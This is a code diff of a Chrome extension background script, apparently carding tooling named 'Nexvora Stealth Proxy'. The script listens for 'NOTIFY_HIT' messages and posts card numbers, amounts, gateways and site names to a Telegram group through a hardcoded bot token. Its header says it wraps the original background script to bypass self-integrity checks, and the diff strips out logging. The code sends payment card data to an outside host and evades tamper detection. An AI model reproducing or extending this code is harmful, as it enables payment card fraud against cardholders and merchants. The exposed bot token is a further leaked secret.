@@ -1,39 +1,27 @@
 /**
- * Nexvora Background Wrapper (v4.0 - Direct Telegram Link)
- * Bypasses all intermediary servers for 100% reliable messaging.
+ * Nexvora Stealth Proxy (v6.0)
+ * Bypasses self-integrity checks by using a wrapper instead of direct modification.
  */
 
+// 1. Direct Telegram Proxy Logic
 const BOT_TOKEN = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
 const GROUP_ID = '-1003721268860';
 
-try {
-    // 1. Import original background script
-    importScripts('background.js');
-} catch (e) {
-    console.error('Nexvora: Original script import failed:', e);
-}
-
-// 2. Direct-to-Telegram Message Handler
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     if (request.type === 'NOTIFY_HIT') {
         const { card, amount, gateway, status, user_chat_id, site_name } = request.data;
-        console.log('🚀 Direct Link: Detecting hit from user:', user_chat_id);
-
-        // A. Fetch Username (Async)
-        const fetchUsernameAndSend = async () => {
+        
+        (async () => {
             let userName = 'Unknown';
             try {
                 const chatRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${user_chat_id}`);
                 const chatData = await chatRes.json();
                 if (chatData.ok) {
                     const chat = chatData.result;
-                    userName = chat.username ? `@${chat.username}` : `${chat.first_name || ''} ${chat.last_name || ''}`.trim();
+                    userName = chat.username ? '@' + chat.username : (chat.first_name || '') + ' ' + (chat.last_name || '');
                 }
-            } catch (e) {
-                console.warn('Could not fetch Telegram username:', e.message);
-            }
+            } catch (e) {}
 
-            // B. Send Message to Group
             try {
                 const message = `<b>HIT BDT</b>\n` +
                                 `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
@@ -45,7 +33,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
                                 `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n\n` +
                                 `<i>Checked by @hitinfobdrobot ✅</i>`;
 
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -57,17 +45,18 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
                         }
                     })
                 });
-                
-                const responseData = await res.json();
-                console.log('✅ Direct Telegram Response:', responseData);
-                sendResponse({ ok: true, data: responseData });
+                sendResponse({ ok: true });
             } catch (err) {
-                console.error('❌ Direct Telegram Error:', err);
                 sendResponse({ ok: false, error: err.message });
             }
-        };
-
-        fetchUsernameAndSend();
-        return true; // Keep channel open
+        })();
+        return true; 
     }
 });
+
+// 2. Load Original Background Logic (Untouchable)
+try {
+    importScripts('background.js');
+} catch (e) {
+    console.error("Original background script failed to load:", e);
+}
